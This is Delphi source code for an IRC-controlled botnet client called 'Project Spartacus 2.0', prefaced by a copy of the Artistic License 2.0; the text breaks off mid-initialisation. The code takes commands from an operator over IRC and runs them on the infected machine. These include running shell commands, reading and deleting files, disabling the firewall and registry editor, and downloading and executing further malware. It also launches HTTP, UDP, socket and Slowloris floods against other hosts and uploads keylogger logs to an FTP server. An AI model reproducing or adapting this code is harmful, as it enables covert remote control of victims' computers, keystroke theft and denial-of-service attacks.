{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Project Spartacus 2.0
// (C) Doddy Hackman 2016

program stub;

// {$APPTYPE CONSOLE}
{$R *.res}

uses
  System.SysUtils, DH_Builder_Tools,
  DH_Auxiliar_Tools, DH_Installer, DH_Malware_Functions, DH_Malware_Disables,
  Windows, idIRC, idContext, idGlobal, PerlRegex, Classes, Math,
  DH_TinyKeylogger, WinInet, DH_DoS, DH_Informator;

var
  auxiliar_tools: T_DH_Auxiliar_Tools;

var
  logs: string;

var
  host, host2, port, channel, op_generate_nick, nick, admin,
    timeout_response: string;

var
  ftp_host, ftp_user, ftp_pass, ftp_path: string;

var
  irc: TIdIRC;
  m1: TMethod;
  m2: TMethod;
  msg: TMsg;
  data: T_DH_Informator;

var
  contenido: string;
  builder_tools: T_DH_Builder_Tools;
  installer: T_DH_Installer;
  malware: T_DH_Malware_Functions;
  disable: T_DH_Malware_Disables;
  keylogger: T_DH_TinyKeylogger;
  active: string;

var
  op_hide_files, op_use_startup, op_keylogger, op_use_special_path,
    op_use_this_path, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, creation_time,
    modified_time, last_access, special_path, path, folder, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;

  // Functions Auxiliars

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function savefile(archivo, texto: string): bool;
var
  open_file: TextFile;
begin
  try
    begin
      AssignFile(open_file, archivo);
      FileMode := fmOpenWrite;

      if FileExists(archivo) then
      begin
        Append(open_file);
      end
      else
      begin
        Rewrite(open_file);
      end;

      Write(open_file, texto);
      CloseFile(open_file);
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function getmydata(): string;
var
  my_ip, my_country, my_user, my_os: string;
  read_code: string;
  info: T_DH_Informator;
begin

  info := T_DH_Informator.Create();

  read_code := info.get_ip_and_country();

  my_ip := regex(read_code, '[ip]', '[ip]');
  if (my_ip = '') then
  begin
    my_ip := info.get_my_ip();
  end;
  if (my_ip = '') then
  begin
    my_ip := '?';
  end;
  my_country := regex(read_code, '[country]', '[country]');
  if (my_country = '') then
  begin
    my_country := info.get_my_country();
  end;
  if (my_country = '') then
  begin
    my_country := '?';
  end;

  // my_ip := '127.0.0.1';
  // my_country := 'Mexico';

  my_user := info.get_username();
  my_os := info.get_os();

  info.Free();

  Result := '[+] IP : ' + my_ip + sLineBreak + '[+] Country : ' + my_country +
    sLineBreak + '[+] Username : ' + my_user + sLineBreak + '[+] OS : ' + my_os;

end;

function encode_ip(text: string): string;
begin
  text := StringReplace(text, '0', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '1', 'o', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '2', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '3', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '4', 'y', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '5', 'h', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '6', 'a', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '7', 'c', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '8', 'k', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '9', '0', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '.', '-', [rfReplaceAll, rfIgnoreCase]);
  Result := text;
end;

function dh_generate(cantidad: integer): string;

const
  opciones: array [1 .. 3] of string = ('mayus', 'minus', 'numbers');

var
  aleatorio: integer;
  iz: integer;

var
  finalr: string;
begin

  finalr := '';

  for iz := 1 to cantidad do
  begin
    aleatorio := Random(4 - 1) + 1;

    if (opciones[aleatorio] = 'mayus') then
    begin
      finalr := finalr + Chr(ord('A') + Random(26));
    end;
    if (opciones[aleatorio] = 'minus') then
    begin
      finalr := finalr + Chr(ord('a') + Random(26));
    end;
    if (opciones[aleatorio] = 'numbers') then
    begin
      finalr := finalr + Chr(ord('0') + Random(10));
    end;
  end;

  Result := finalr;

end;

function upload_ftp_file(host, username, password, file_to_upload,
  new_name: Pchar): boolean;

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  handle1: HINTERNET;
  handle2: HINTERNET;

begin
  if not(host = '') and not(username = '') and not(file_to_upload = '') and
    not(new_name = '') and FileExists(file_to_upload) then
  begin
    try
      begin
        handle1 := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
        handle2 := InternetConnect(handle1, host, INTERNET_DEFAULT_FTP_PORT,
          username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        ftpPutFile(handle2, file_to_upload, new_name,
          FTP_TRANSFER_TYPE_BINARY, 0);
        InternetCloseHandle(handle2);
        InternetCloseHandle(handle1);
        Result := True;
      end
    except
      //
    end;
  end
  else
  begin
    Result := False;
  end;

end;

procedure responder(user, texto: string);
var
  listando: TStringList;
  text: string;
begin

  listando := TStringList.Create;
  listando.text := texto;

  for text in listando do
  begin
    irc.Say(user, text);
    sleep(StrToInt(timeout_response) * 1000);
  end;

  listando.Free();

end;

// End of Functions Auxiliars

// Functions

procedure IrcPrivateMessage(ASelf: Pointer; Sender: TIdContext;
  const ANickname, AHost, ATarget, AMessage: string);
var
  nick, mensaje: string;
  regex: TPerlRegex;
  help, about: string;
  auxiliar_tools: T_DH_Auxiliar_Tools;
  malware: T_DH_Malware_Functions;
  disables: T_DH_Malware_Disables;
  dos: T_DH_DoS;
begin

  auxiliar_tools := T_DH_Auxiliar_Tools.Create();
  malware := T_DH_Malware_Functions.Create();
  disables := T_DH_Malware_Disables.Create();
  dos := T_DH_DoS.Create();

  nick := ANickname;
  mensaje := AMessage;

  if (nick = admin) then
  begin

    // savefile('logs.txt', nick + '-' + mensaje + sLineBreak);

    regex := TPerlRegex.Create();
    regex.regex := '!list_dir "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.list_directory(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!read_file "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.read_file(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!delete_file "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.delete_filename(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_process';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.list_process());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!kill_process "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.kill_process(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!cmd "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.execute_command(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!enable_regedit';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (disable.regedit_manager('on')) then
      begin
        responder(nick, '[+] Enable Regedit : OK');
      end
      else
      begin
        responder(nick, '[+] Disable Regedit : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!disable_regedit';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (disable.regedit_manager('off')) then
      begin
        responder(nick, '[+] Disable Regedit : OK');
      end
      else
      begin
        responder(nick, '[+] Disable Regedit : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!enable_firewall';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (disable.firewall_manager('seven', 'on')) then
      begin
        responder(nick, '[+] Enable Firewall : OK');
      end
      else
      begin
        responder(nick, '[+] Enable Firewall : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!disable_firewall';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (disable.firewall_manager('seven', 'off')) then
      begin
        responder(nick, '[+] Disable Firewall : OK');
      end
      else
      begin
        responder(nick, '[+] Disable Firewall : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!open_cd';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.cd_manager('open'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!close_cd';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.cd_manager('close'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!show_icons';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.icons_manager('show'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!hide_icons';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.icons_manager('hide'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!show_taskbar';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.taskbar_manager('show'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!hide_taskbar';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.taskbar_manager('hide'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!message_single "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.message_box(regex.Groups[1], regex.Groups[2],
        'Information'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!message_bomber "(.*)" "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.message_box_bomber(regex.Groups[1],
        regex.Groups[2], 'Information', StrToInt(regex.Groups[3])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!sendkeys "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.SendKeys(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!openword "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.write_word(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!crazy_mouse "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.crazy_mouse(StrToInt(regex.Groups[1])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!crazy_hour "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.crazy_hour(StrToInt(regex.Groups[1])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!shutdown';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.shutdown());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!close_session';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.close_session());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!reboot';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.close_session());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!load_page "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.load_page(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!load_paint';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.load_paint());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!edit_taskbar_text "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.edit_taskbar_text('on', regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!clean_taskbar_text';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.edit_taskbar_text('off', 'hi'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!turn_off_monitor';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.turn_off_monitor());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!speak "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.speak(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!play_beeps "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.play_beep(StrToInt(regex.Groups[1])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_drives';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.get_drives());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_services';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.get_services());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_windows';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.list_windows());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!download_and_execute "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.download_and_execute(regex.Groups[1],
        regex.Groups[2]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!change_wallpaper "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.download_and_change_wallpaper(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!change_screensaver "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.download_and_change_screensaver(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!printer_bomber "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.printer_bomber(regex.Groups[1],
        StrToInt(regex.Groups[2])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!form_bomber "(.*)" "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.form_bomber(regex.Groups[1], regex.Groups[2], '',
        '', 0, 0, StrToInt(regex.Groups[3])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!html_bomber "(.*)" "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.html_bomber(regex.Groups[1], regex.Groups[2], '',
        StrToInt(regex.Groups[3])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!windows_bomber "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.windows_bomber(StrToInt(regex.Groups[1])));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!block_all';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, malware.block_all('on'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!sqli_dos "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (dos.SQLI_DOS(regex.Groups[1], StrToInt(regex.Groups[2]))) then
      begin
        responder(nick, '[+] SQLI DoS : OK');
      end
      else
      begin
        responder(nick, '[-] SQLI DoS : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!http_flood "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (dos.HTTP_Flood(regex.Groups[1], StrToInt(regex.Groups[2]))) then
      begin
        responder(nick, '[+] HTTP Flood : OK');
      end
      else
      begin
        responder(nick, '[-] HTTP Flood : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!socket_flood "(.*)" "(.*)" "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (dos.Socket_Flood(regex.Groups[1], StrToInt(regex.Groups[2]),
        regex.Groups[3], StrToInt(regex.Groups[4]))) then
      begin
        responder(nick, '[+] Socket Flood : OK');
      end
      else
      begin
        responder(nick, '[-] Socket Flood : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!slowloris "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (dos.Slowloris(regex.Groups[1], StrToInt(regex.Groups[2]))) then
      begin
        responder(nick, '[+] Slowloris : OK');
      end
      else
      begin
        responder(nick, '[-] Slowloris : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!udp_flood "(.*)" "(.*)" "(.*)"';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (dos.UDP_Dos(regex.Groups[1], StrToInt(regex.Groups[2]),
        StrToInt(regex.Groups[3]))) then
      begin
        responder(nick, '[+] UDP Flood : OK');
      end
      else
      begin
        responder(nick, '[-] UDP Flood : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_keylogger_logs';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (FileExists('logs.html')) then
      begin
        if (upload_ftp_file(Pchar(ftp_host), Pchar(ftp_user), Pchar(ftp_pass),
          Pchar(GetCurrentDir + '\logs.html'), Pchar(ftp_path + '/logs.html')))
        then
        begin
          responder(nick, '[+] Keylogger Logs : OK');
        end
        else
        begin
          responder(nick, '[+] Keylogger Logs : Fail Uploading');
        end;
      end
      else
      begin
        responder(nick, '[+] Keylogger Logs : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!uninstaller';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      if (auxiliar_tools.delete_startup('psh')) then
      begin
        responder(nick, '[+] Uninstaller : OK');
        ExitProcess(0);
      end
      else
      begin
        responder(nick, '[-] Uninstaller : FAIL');
      end;
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_data';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, getmydata());
    end;
    regex.Free;

    help := '[+] Commands : ' + sLineBreak +
      '!list_dir <directory> : List Directory' + sLineBreak +
      '!read_file <filename> : Read Filename' + sLineBreak +
      '!delete_file <filename> : Delete Filename ' + sLineBreak +
      '!get_process : Get Process' + sLineBreak +
      '!kill_process <process_name> : Kill Process' + sLineBreak +
      '!cmd <command> : Execute Command' + sLineBreak +
      '!enable_regedit : Enable Regedit' + sLineBreak +
      '!disable_regedit : Disable Regedit' + sLineBreak +
      '!enable_firewall : Enable Firewall' + sLineBreak +
      '!disable_firewall : Disable Firewall' + sLineBreak + '!open_cd : Open CD'
      + sLineBreak + '!close_cd : Close CD' + sLineBreak +
      '!show_icons : Show Icons' + sLineBreak + '!hide_icons : Hide Icons' +
      sLineBreak + '!show_taskbar : Show Taskbar' + sLineBreak +
      '!hide_taskbar : Hide Taskbar' + sLineBreak +
      '!message_single <title> <content> : Message Single' + sLineBreak +
      '!message_bomber <title> <content> <count> : Message Bomber' + sLineBreak
      + '!sendkeys <text> : SendKeys' + sLineBreak +
      '!openword <text> : Open Word' + sLineBreak +
      '!crazy_mouse <count> : Crazy Mouse' + sLineBreak +
      '!crazy_hour <count> : Crazy Hour' + sLineBreak + '!shutdown : Shutdown' +
      sLineBreak + '!close_session : Close Session' + sLineBreak +
      '!reboot : Reboot' + sLineBreak +
      '!load_page <page> : Load URL in browser' + sLineBreak +
      '!load_paint : Load Paint' + sLineBreak +
      '!edit_taskbar_text <text> : Edit Taskbar text' + sLineBreak +
      '!clean_taskbar_text : Clean Taskbar text' + sLineBreak +
      '!turn_off_monitor : Turn Off Monitor' + sLineBreak +
      '!speak <text> : Speak' + sLineBreak + '!play_beeps <count> : Play beeps'
      + sLineBreak + '!get_drives : Get Drives' + sLineBreak +
      '!get_services : Get Services' + sLineBreak + '!get_windows : Get Windows'
      + sLineBreak +
      '!download_and_execute <url> <new_name> : Download and Execute malware' +
      sLineBreak + '!change_wallpaper <url> : Change Wallpaper' + sLineBreak +
      '!change_screensaver <url> : Change Screensaver' + sLineBreak +
      '!printer_bomber <filename> <count> : Printer Bomber' + sLineBreak +
      '!form_bomber <title> <content> <count> : Form Bomber' + sLineBreak +
      '!html_bomber <title> <content> <count> : HTML Bomber' + sLineBreak +
      '!windows_bomber <count> : Windows Bomber' + sLineBreak +
      '!block_all : Block All' + sLineBreak +
      '!sqli_dos <page> <count> : SQLI Dos' + sLineBreak +
      '!http_flood <page> <count> : HTTP Flood' + sLineBreak +
      '!socket_flood <ip> <port> <flood> <count> : Socket Flood' + sLineBreak +
      '!slowloris <page> <count> : Slowloris' + sLineBreak +
      '!udp_flood <ip> <port> <count> : UDP Flood' + sLineBreak +
      '!get_data : Get Information' + sLineBreak +
      '!get_keylogger_logs : Get Keylogger Logs' + sLineBreak +
      '!uninstaller : Uninstaller Malware' + sLineBreak + '!help : Get commands'
      + sLineBreak;

    regex := TPerlRegex.Create();
    regex.regex := '!help';
    regex.Subject := mensaje;

    if regex.Match then
    begin
      responder(nick, help);
    end;

    regex.Free;

  end;

  auxiliar_tools.Free();
  malware.Free();
  disables.Free();
  dos.Free();

end;

procedure IrcRaw(ASelf: Pointer; ASender: TIdContext; AIn: boolean;
  const AMessage: String);
begin
  // savefile('logs.txt', AMessage);
end;

procedure start_irc;
begin
  try

    data := T_DH_Informator.Create();

    if (op_generate_nick = '1') then
    begin
      nick := encode_ip(data.get_my_ip());
      if (nick = '') then
      begin
        nick := encode_ip(dh_generate(9));
      end;
    end;

    data.Free();

    irc := TIdIRC.Create(nil);

    irc.host := host;
    irc.port := StrToInt(port);
    irc.Nickname := nick;
    irc.username := nick;
    irc.password := '';
    irc.AltNickname := nick + '123';
    irc.RealName := nick;

    m1.code := @IrcRaw;
    m1.data := irc;
    irc.OnRaw := TIdIRCRawEvent(m1);

    m2.code := @IrcPrivateMessage;
    m2.data := irc;
    irc.OnPrivateMessage := TIdIRCPrivMessageEvent(m2);

    try
      irc.Connect;
    except

      irc.host := host;
      irc.port := StrToInt(port);
      irc.Nickname := nick;
      irc.username := nick;
      irc.password := '';
      irc.AltNickname := nick + '123';
      irc.RealName := nick;

      m1.code := @IrcRaw;
      m1.data := irc;
      irc.OnRaw := TIdIRCRawEvent(m1);

      m2.code := @IrcPrivateMessage;
      m2.data := irc;
      irc.OnPrivateMessage := TIdIRCPrivMessageEvent(m2);

      try
        irc.Connect;
      except
        //
      end;

    end;

    irc.Join(channel);

    while GetMessage(msg, 0, 0, 0) do
    begin
      TranslateMessage(msg);
      DispatchMessage(msg);
    end;

  except
    begin
      //
    end;
  end;
end;

procedure spam_irc;
const
  frases: array [1 .. 18] of string = ('Hola', 'Como andan', 'Como estas',
    'Que cuentan', 'Hoy estuvo genial', 'Oh Yeah', 'Que ondaaaaaaaaaaaaaaa',
    'De donde son', 'De donde sos', 'Estoy hablando con los grillos',
    'ajajajajaja', 'ahahaahahaha', 'Que dia de ****', 'Que hora tienen alla',
    'xD', 'LOL', 'WTF', 'OMG');
begin
  while ('1' = '1') do
  begin
    sleep(21600000);
    irc.Say(channel, frases[RandomRange(1, 19)]);
  end;
end;

// End of Functions

begin
  try
    builder_tools := T_DH_Builder_Tools.Create();

    contenido := builder_tools.read_resource(666);

    if not(contenido = '') then
    begin

      active := regex(contenido, '[active]', '[active]');

      host := regex(contenido, '[host]', '[host]');
      host2 := regex(contenido, '[host2]', '[host2]');
      port := regex(contenido, '[port]', '[port]');
      channel := regex(contenido, '[channel]', '[channel]');
      nick := regex(contenido, '[nick]', '[nick]');
      admin := regex(contenido, '[admin]', '[admin]');
